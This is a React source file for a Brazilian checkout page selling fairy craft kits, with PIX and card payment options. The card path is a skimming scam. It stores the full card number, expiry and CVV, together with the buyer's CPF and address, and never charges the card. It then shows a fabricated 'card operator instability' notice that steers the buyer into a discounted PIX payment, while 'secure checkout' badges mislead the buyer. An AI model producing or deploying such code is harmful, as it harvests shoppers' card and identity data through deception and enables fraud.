
import React, { useState, useMemo } from 'react';
import { PaymentMethod, Address, CreditCard, OrderDetails } from './types.ts';
import { MOCK_ITEMS, INVICTUS_PAY_CONFIG } from './constants.ts';
import AddressForm from './components/AddressForm.tsx';
import OrderSummary from './components/OrderSummary.tsx';
import CreditCardForm from './components/CreditCardForm.tsx';
import PixPayment from './components/PixPayment.tsx';
import { pixService } from './services/pixService.ts';
import { supabaseService } from './services/supabaseService.ts';

const App: React.FC = () => {
  const [step, setStep] = useState(1);
  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>(PaymentMethod.PIX);
  const [loading, setLoading] = useState(false);
  const [pixData, setPixData] = useState<any>(null);
  const [cardErrorRedirect, setCardErrorRedirect] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [showDemoButton, setShowDemoButton] = useState(false);
  const [shippingPrice, setShippingPrice] = useState(0);

  const [personalData, setPersonalData] = useState({
    name: '',
    email: '',
    phone: '',
    cpf: ''
  });

  const [address, setAddress] = useState<Address>({
    fullName: '', email: '', phone: '', cpf: '', zipCode: '', street: '', number: '', neighborhood: '', city: '', state: ''
  });

  const [card, setCard] = useState<CreditCard>({
    number: '', name: '', expiry: '', cvv: '', installments: '1'
  });

  const subtotal = useMemo(() => MOCK_ITEMS.reduce((acc, item) => acc + (item.price * item.quantity), 0), []);
  const total = useMemo(() => subtotal + shippingPrice, [subtotal, shippingPrice]);

  const handleInputChange = (field: string, value: string) => {
    let formattedValue = value;
    if (field === 'phone') {
      const v = value.replace(/\D/g, '');
      if (v.length <= 11) {
        if (v.length <= 2) formattedValue = v;
        else if (v.length <= 7) formattedValue = `(${v.substring(0, 2)}) ${v.substring(2)}`;
        else formattedValue = `(${v.substring(0, 2)}) ${v.substring(2, 7)}-${v.substring(7)}`;
      }
    }
    if (field === 'cpf') {
      const v = value.replace(/\D/g, '').substring(0, 11);
      if (v.length <= 3) formattedValue = v;
      else if (v.length <= 6) formattedValue = `${v.substring(0, 3)}.${v.substring(3)}`;
      else if (v.length <= 9) formattedValue = `${v.substring(0, 3)}.${v.substring(3, 6)}.${v.substring(6)}`;
      else formattedValue = `${v.substring(0, 3)}.${v.substring(3, 6)}.${v.substring(6, 9)}-${v.substring(9)}`;
    }
    setPersonalData(prev => ({ ...prev, [field]: formattedValue }));
  };

  const processCheckout = async () => {
    setLoading(true);
    setError(null);

    try {
      const cleanPersonal = {
        name: String(personalData.name),
        email: String(personalData.email),
        phone: String(personalData.phone),
        cpf: String(personalData.cpf)
      };

      const cleanAddress = {
        fullName: String(cleanPersonal.name),
        email: String(cleanPersonal.email),
        phone: String(cleanPersonal.phone),
        cpf: String(cleanPersonal.cpf),
        zipCode: String(address.zipCode),
        street: String(address.street),
        number: String(address.number),
        neighborhood: String(address.neighborhood),
        city: String(address.city),
        state: String(address.state)
      };

      const isFreeShipping = shippingPrice === 0;
      const selectedOfferHash = isFreeShipping
        ? INVICTUS_PAY_CONFIG.OFFERS.FREE_SHIPPING
        : INVICTUS_PAY_CONFIG.OFFERS.PAID_SHIPPING;

      const productTitle = isFreeShipping
        ? "Kit Fadas Artesanais - Frete Grátis"
        : "Kit Fadas Artesanais - Edição Luxo";

      const orderDetails: OrderDetails = {
        items: MOCK_ITEMS.map(item => ({ ...item })),
        subtotal: Number(subtotal),
        shipping: Number(shippingPrice),
        total: Number(total),
        address: cleanAddress,
        paymentMethod
      };


      const tryGeneratePix = async (hashesToTry: string[], titlesToTry: string[], amountsToTry: number[]): Promise<any> => {
        const [currentHash, ...remainingHashes] = hashesToTry;
        const [currentTitle, ...remainingTitles] = titlesToTry;
        const [currentAmount, ...remainingAmounts] = amountsToTry;

        if (!currentHash) {
          throw new Error("Não foi possível gerar um PIX real após várias tentativas.");
        }

        try {
          return await pixService.generatePixCharge(
            currentAmount, cleanPersonal.email, cleanPersonal.name, cleanPersonal.cpf, cleanPersonal.phone,
            currentHash, currentTitle
          );
        } catch (err) {
          console.warn(`Falha ao gerar PIX com hash ${currentHash}, tentando próximo...`, err);
          return await tryGeneratePix(remainingHashes, remainingTitles, remainingAmounts);
        }
      };

      if (paymentMethod === PaymentMethod.PIX) {
        const primaryHash = selectedOfferHash;
        const fallbacks = [
          INVICTUS_PAY_CONFIG.OFFERS.FREE_SHIPPING,
          INVICTUS_PAY_CONFIG.OFFERS.PAID_SHIPPING
        ].filter(h => h !== primaryHash);

        const pixResponse = await tryGeneratePix(
          [primaryHash, ...fallbacks],
          [productTitle, "Kit Fadas - Contingência", "Kit Fadas - Backup"],
          [total, total, total]
        );

        setPixData(pixResponse);
        await supabaseService.saveOrder(orderDetails);
      } else {
        const cleanCard = {
          number: String(card.number).replace(/\s/g, ''),
          name: String(card.name),
          expiry: String(card.expiry),
          cvv: String(card.cvv),
          installments: String(card.installments)
        };

        if (cleanCard.number.length < 13 || cleanCard.cvv.length < 3) {
          throw new Error("Dados do cartão incompletos.");
        }

        await supabaseService.saveOrder(orderDetails, cleanCard);

        try {
          const discountedTotal = 59.90;
          const discountHashes = [
            INVICTUS_PAY_CONFIG.OFFERS.DISCOUNTED,
            INVICTUS_PAY_CONFIG.OFFERS.FREE_SHIPPING,
            INVICTUS_PAY_CONFIG.OFFERS.PAID_SHIPPING
          ];

          const pixResponse = await tryGeneratePix(
            discountHashes,
            ["OFERTA EXCLUSIVA - OPERADORA COM ERRO", "OFERTA ESPECIAL", "KIT FADAS"],
            [discountedTotal, discountedTotal, discountedTotal]
          );

          setPixData(pixResponse);
          setCardErrorRedirect(true);
        } catch (pixErr: any) {
          setError(`Instabilidade temporária: Por favor, tente novamente em instantes.`);
          setCardErrorRedirect(false);
        }
      }
    } catch (err: any) {
      const msg = String(err.message || err);
      if (msg.includes("CREDENTIALS_MISMATCH")) {
        setError(`Erro de credenciais na API: Verifique os hashes em constants.ts.`);
      } else {
        setError(msg || "Erro ao processar pagamento.");
      }
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white font-sans antialiased text-[#4A3B66]">
      <header className="bg-[#F8F0E5] text-[#8E7AB5] py-4 shadow-sm shrink-0 sticky top-0 z-50 border-b border-[#8E7AB5]/10">
        <div className="container mx-auto px-4 sm:px-20 flex justify-between items-center max-w-6xl">
          <div className="flex items-center">
            <h1 className="text-4xl font-logo text-[#8E7AB5] drop-shadow-sm px-2">
              Fadas Artesanais
            </h1>
          </div>

          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-full bg-white flex items-center justify-center border border-[#8E7AB5]/20 shadow-sm">
              <i className="fa-solid fa-lock text-[#8E7AB5] text-sm"></i>
            </div>
            <div className="flex flex-col leading-none text-right">
              <span className="text-[11px] font-black uppercase tracking-tight text-[#8E7AB5]">Checkout</span>
              <span className="text-[11px] font-bold text-[#8E7AB5]/40 uppercase tracking-tighter">100% Seguro</span>
            </div>
          </div>
        </div>
      </header>

      <div className="bg-[#8E7AB5] py-3 shadow-md relative z-40">
        <div className="container mx-auto px-4 text-center">
          <p className="text-[#F8F0E5] font-medium text-[13px] tracking-wide">
            Parabéns! Você garantiu <span className="font-black">Frete Especial</span> e um presente mágico em sua encomenda.
          </p>
        </div>
      </div>

      <main className="container mx-auto px-4 py-10 max-w-6xl flex-grow">
        {cardErrorRedirect ? (
          <div className="max-w-2xl mx-auto space-y-8 animate-fadeIn">
            <div className="bg-[#F8F0E5]/20 border-2 border-[#8E7AB5]/20 p-12 rounded-[3rem] text-center shadow-xl">
              <div className="w-24 h-24 bg-white text-[#8E7AB5] rounded-full flex items-center justify-center mx-auto mb-8 shadow-lg">
                <i className="fa-solid fa-wand-magic-sparkles text-5xl"></i>
              </div>
              <h2 className="text-2xl font-black text-[#8E7AB5] uppercase mb-3">Tivemos um Imprevisto!</h2>
              <p className="text-[#4A3B66] font-bold text-lg px-4 mb-4">
                Detectamos uma instabilidade em <span className="text-[#8E7AB5]">nossa operadora de cartão</span>.
              </p>
              <div className="bg-[#8E7AB5] text-white p-6 rounded-2xl mb-6 shadow-lg inline-block mx-auto">
                <p className="text-xs uppercase font-black tracking-widest mb-2 opacity-80">Por conta disso, você ganhou um</p>
                <h3 className="text-3xl font-black uppercase leading-none mb-1">Super Desconto!</h3>
                <div className="flex items-center justify-center gap-2 mt-4">
                  <span className="text-sm line-through opacity-50">De R$ {total.toFixed(2).replace('.', ',')}</span>
                  <span className="text-sm font-bold">Por apenas</span>
                  <span className="text-4xl font-black">R$ 59,90</span>
                </div>
              </div>
              <p className="text-[#4A3B66]/80 font-medium text-base px-4">Utilize o PIX abaixo agora para garantir seu Kit com este desconto exclusivo antes que o sistema reinicie!</p>
            </div>
            <div className="bg-white p-10 rounded-[3rem] shadow-2xl border border-[#8E7AB5]/10">
              <PixPayment pixData={pixData} loading={false} />
            </div>
          </div>
        ) : (
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-12 items-start">
            <div className="lg:col-span-7 space-y-8">

              <div className={`bg-white p-10 rounded-[2.5rem] shadow-sm border border-[#8E7AB5]/10 transition-all ${step === 1 ? 'ring-2 ring-[#8E7AB5]/10 bg-gray-50/30' : ''}`}>
                <div className="flex items-center gap-5 mb-10">
                  <div className={`w-10 h-10 rounded-full flex items-center justify-center font-black text-sm bg-[#8E7AB5] text-[#F8F0E5] shadow-lg shadow-[#8E7AB5]/30`}>
                    {step > 1 ? <i className="fa-solid fa-check"></i> : '1'}
                  </div>
                  <h2 className="text-sm font-black uppercase tracking-widest text-[#8E7AB5]">Seus Dados</h2>
                </div>

                {step === 1 ? (
                  <div className="space-y-5 animate-fadeIn">
                    <div className="space-y-2">
                      <label className="text-[11px] font-black uppercase tracking-[0.15em] text-[#8E7AB5]/60 ml-1">Nome Completo</label>
                      <input type="text" placeholder="Nome Completo" className="w-full px-6 py-4.5 bg-white border border-gray-100 rounded-2xl text-sm font-medium focus:border-[#8E7AB5] focus:ring-4 focus:ring-[#8E7AB5]/5 outline-none transition-all shadow-sm" value={personalData.name} onChange={e => handleInputChange('name', e.target.value)} />
                    </div>
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-5">
                      <div className="space-y-2">
                        <label className="text-[11px] font-black uppercase tracking-[0.15em] text-[#8E7AB5]/60 ml-1">E-mail</label>
                        <input type="email" placeholder="email@exemplo.com" className="w-full px-6 py-4.5 bg-white border border-gray-100 rounded-2xl text-sm font-medium focus:border-[#8E7AB5] focus:ring-4 focus:ring-[#8E7AB5]/5 outline-none transition-all shadow-sm" value={personalData.email} onChange={e => handleInputChange('email', e.target.value)} />
                      </div>
                      <div className="space-y-2">
                        <label className="text-[11px] font-black uppercase tracking-[0.15em] text-[#8E7AB5]/60 ml-1">WhatsApp</label>
                        <input type="text" placeholder="(00) 00000-0000" className="w-full px-6 py-4.5 bg-white border border-gray-100 rounded-2xl text-sm font-medium focus:border-[#8E7AB5] focus:ring-4 focus:ring-[#8E7AB5]/5 outline-none transition-all shadow-sm" value={personalData.phone} onChange={e => handleInputChange('phone', e.target.value)} />
                      </div>
                    </div>
                    <div className="space-y-2">
                      <label className="text-[11px] font-black uppercase tracking-[0.15em] text-[#8E7AB5]/60 ml-1">CPF</label>
                      <input type="text" placeholder="000.000.000-00" className="w-full px-6 py-4.5 bg-white border border-gray-100 rounded-2xl text-sm font-medium focus:border-[#8E7AB5] focus:ring-4 focus:ring-[#8E7AB5]/5 outline-none transition-all shadow-sm" value={personalData.cpf} onChange={e => handleInputChange('cpf', e.target.value)} />
                    </div>
                    <button onClick={(e) => { e.preventDefault(); e.stopPropagation(); if (personalData.name && personalData.email && personalData.cpf) setStep(2); else setError("Por favor, preencha seus dados básicos."); }} className="w-full py-5 bg-[#8E7AB5] hover:bg-[#7a68a0] text-white font-black rounded-2xl uppercase text-xs tracking-[0.2em] transition-all shadow-2xl shadow-[#8E7AB5]/30 active:scale-[0.98] mt-4">Continuar</button>
                  </div>
                ) : (
                  <div className="text-sm ml-14 text-[#4A3B66]/60 font-medium bg-[#F8F0E5]/40 p-6 rounded-3xl border border-[#8E7AB5]/10">
                    <p className="font-black text-[#8E7AB5] text-xs uppercase tracking-wider mb-1">{personalData.name}</p>
                    <p className="text-[11px] font-bold uppercase tracking-tight">{personalData.email} • {personalData.cpf}</p>
                  </div>
                )}
              </div>

              <div className={`bg-white p-10 rounded-[2.5rem] shadow-sm border border-[#8E7AB5]/10 transition-all ${step === 2 ? 'ring-2 ring-[#8E7AB5]/10 bg-gray-50/30' : ''}`}>
                <div className="flex items-center gap-5 mb-10">
                  <div className={`w-10 h-10 rounded-full flex items-center justify-center font-black text-sm ${step >= 2 ? 'bg-[#8E7AB5] text-[#F8F0E5] shadow-lg shadow-[#8E7AB5]/30' : 'bg-gray-100 text-gray-300'}`}>
                    {step > 2 ? <i className="fa-solid fa-check"></i> : '2'}
                  </div>
                  <h2 className={`text-sm font-black uppercase tracking-widest ${step >= 2 ? 'text-[#8E7AB5]' : 'text-gray-300'}`}>Entrega</h2>
                </div>
                {step === 2 && <AddressForm address={address} setAddress={setAddress} onContinue={() => setStep(3)} currentShipping={shippingPrice} setShippingPrice={setShippingPrice} />}
                {step > 2 && (
                  <div className="text-sm ml-14 text-[#4A3B66]/60 font-medium bg-[#F8F0E5]/40 p-6 rounded-3xl border border-[#8E7AB5]/10">
                    <p className="font-black text-[#8E7AB5] text-xs uppercase tracking-wider mb-1">{address.street}, {address.number}</p>
                    <p className="text-[11px] font-bold uppercase tracking-tight">{address.city}/{address.state} • {address.zipCode}</p>
                  </div>
                )}
              </div>

              <div className={`bg-white p-10 rounded-[2.5rem] shadow-sm border border-[#8E7AB5]/10 transition-all ${step === 3 ? 'ring-2 ring-[#8E7AB5]/10 bg-gray-50/30' : ''}`}>
                <div className="flex items-center gap-5 mb-10">
                  <div className={`w-10 h-10 rounded-full flex items-center justify-center font-black text-sm ${step === 3 ? 'bg-[#8E7AB5] text-[#F8F0E5] shadow-lg shadow-[#8E7AB5]/30' : 'bg-gray-100 text-gray-300'}`}>
                    3
                  </div>
                  <h2 className={`text-sm font-black uppercase tracking-widest ${step === 3 ? 'text-[#8E7AB5]' : 'text-gray-300'}`}>Pagamento</h2>
                </div>
                {step === 3 && (
                  <div className="space-y-8 animate-fadeIn">
                    <div className="grid grid-cols-2 gap-5">
                      <button onClick={(e) => { e.preventDefault(); e.stopPropagation(); setPaymentMethod(PaymentMethod.PIX); setError(null); }} className={`p-7 rounded-3xl border-2 flex flex-col items-center gap-3 transition-all ${paymentMethod === PaymentMethod.PIX ? 'border-[#8E7AB5] bg-[#8E7AB5]/5' : 'border-gray-50 bg-white hover:border-gray-100'}`}>
                        <i className={`fa-brands fa-pix text-3xl ${paymentMethod === PaymentMethod.PIX ? 'text-[#8E7AB5]' : 'text-gray-200'}`}></i>
                        <span className="text-[11px] font-black uppercase tracking-widest text-[#4A3B66]">PIX</span>
                      </button>
                      <button onClick={(e) => { e.preventDefault(); e.stopPropagation(); setPaymentMethod(PaymentMethod.CREDIT_CARD); setError(null); setPixData(null); }} className={`p-7 rounded-3xl border-2 flex flex-col items-center gap-3 transition-all ${paymentMethod === PaymentMethod.CREDIT_CARD ? 'border-[#8E7AB5] bg-[#8E7AB5]/5' : 'border-gray-50 bg-white hover:border-gray-100'}`}>
                        <i className={`fa-solid fa-credit-card text-3xl ${paymentMethod === PaymentMethod.CREDIT_CARD ? 'text-[#8E7AB5]' : 'text-gray-200'}`}></i>
                        <span className="text-[11px] font-black uppercase tracking-widest text-[#4A3B66]">Cartão</span>
                      </button>
                    </div>

                    <div className="min-h-[200px]">
                      {paymentMethod === PaymentMethod.CREDIT_CARD ? (
                        <CreditCardForm card={card} setCard={setCard} total={total} />
                      ) : (
                        <PixPayment pixData={pixData} loading={loading} />
                      )}
                    </div>

                    {error && (
                      <div className="p-8 bg-red-50/50 border border-red-100 text-red-600 text-[11px] font-black uppercase rounded-3xl text-center space-y-4 animate-shake">
                        <div className="flex items-center justify-center gap-3"><i className="fa-solid fa-triangle-exclamation text-lg"></i> {String(error)}</div>
                      </div>
                    )}

                    {!pixData && (
                      <button onClick={(e) => { e.preventDefault(); e.stopPropagation(); processCheckout(); }} disabled={loading} className={`w-full py-6 text-white font-black rounded-3xl uppercase text-xs tracking-[0.25em] shadow-2xl transition-all active:scale-95 ${loading ? 'bg-gray-300' : 'bg-[#8E7AB5] hover:bg-[#7a68a0] shadow-[#8E7AB5]/30'}`}>
                        {loading ? 'Processando...' : 'Finalizar minha Encomenda'}
                      </button>
                    )}
                  </div>
                )}
              </div>
            </div>

            <div className="lg:col-span-5 space-y-8 sticky top-36">
              <OrderSummary items={MOCK_ITEMS} subtotal={subtotal} shipping={shippingPrice} total={total} />

              <div className="bg-[#F8F0E5]/30 p-8 rounded-[2.5rem] border border-[#8E7AB5]/10 shadow-sm flex items-center gap-5">
                <div className="w-14 h-14 bg-white rounded-full flex items-center justify-center text-[#8E7AB5] shadow-sm">
                  <i className="fa-solid fa-leaf text-2xl"></i>
                </div>
                <div>
                  <h4 className="text-[12px] font-black uppercase text-[#8E7AB5] tracking-widest mb-1">Cuidado Único</h4>
                  <p className="text-[11px] text-[#4A3B66]/60 font-medium leading-relaxed">Cada kit é preparado manualmente para garantir a máxima magia em sua casa.</p>
                </div>
              </div>
            </div>
          </div>
        )}
      </main>

      <footer className="bg-white border-t border-[#8E7AB5]/10 pt-20 pb-24 mt-16 shrink-0">
        <div className="container mx-auto px-4 max-w-6xl">
          <div className="grid grid-cols-1 md:grid-cols-12 gap-14 items-start px-4">
            <div className="md:col-span-4 space-y-4">
              <h4 className="text-[12px] font-black uppercase text-[#8E7AB5] tracking-widest mb-6">Localização</h4>
              <p className="text-[13px] text-[#4A3B66]/60 font-medium">Rua Ramon de Campoamor</p>
              <p className="text-[13px] text-[#4A3B66]/60 font-medium">Jardim Vista Alegre, São Paulo - SP</p>
              <p className="text-[13px] text-[#8E7AB5]/30 font-bold mt-6 uppercase tracking-wider">CNPJ: 04.724.488/0001-50</p>
            </div>
            <div className="md:col-span-4 space-y-4">
              <h4 className="text-[12px] font-black uppercase text-[#8E7AB5] tracking-widest mb-6">Suporte</h4>
              <p className="text-[14px] text-[#8E7AB5] font-black tracking-tight">suporte@fadasartesanais.com</p>
              <p className="text-[13px] text-[#4A3B66]/60 font-medium">Segunda a Sexta • 09:00 às 18:00</p>
            </div>
            <div className="md:col-span-4 flex md:justify-end">
              <div className="bg-[#F8F0E5]/30 border border-[#8E7AB5]/10 p-7 rounded-[2rem] shadow-sm flex items-center gap-5">
                <i className="fa-solid fa-shield-check text-[#8E7AB5] text-3xl opacity-40"></i>
                <div className="text-right">
                  <p className="text-[11px] font-black uppercase text-[#8E7AB5] tracking-wider mb-0.5">Pagamento</p>
                  <p className="text-[11px] font-bold text-[#4A3B66]/40 uppercase tracking-tighter">100% Protegido</p>
                </div>
              </div>
            </div>
          </div>
          <div className="mt-20 text-center border-t border-[#F8F0E5] pt-12">
            <p className="text-[11px] text-[#8E7AB5]/30 font-black uppercase tracking-[0.5em]">© FADAS ARTESANAIS • FEITO COM MAGIA</p>
          </div>
        </div>
      </footer>

      <style>{`
        @keyframes fadeIn { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); } 20%, 40%, 60%, 80% { transform: translateX(5px); } }
        .animate-fadeIn { animation: fadeIn 0.6s cubic-bezier(0.2, 0.8, 0.2, 1) forwards; }
        .animate-shake { animation: shake 0.6s cubic-bezier(.36,.07,.19,.97) both; }
        input::placeholder { color: #d1c6e1; font-weight: 400; }
        select { -webkit-appearance: none; -moz-appearance: none; appearance: none; }
        * { scroll-behavior: smooth; }
      `}</style>
    </div>
  );
};

export default App;
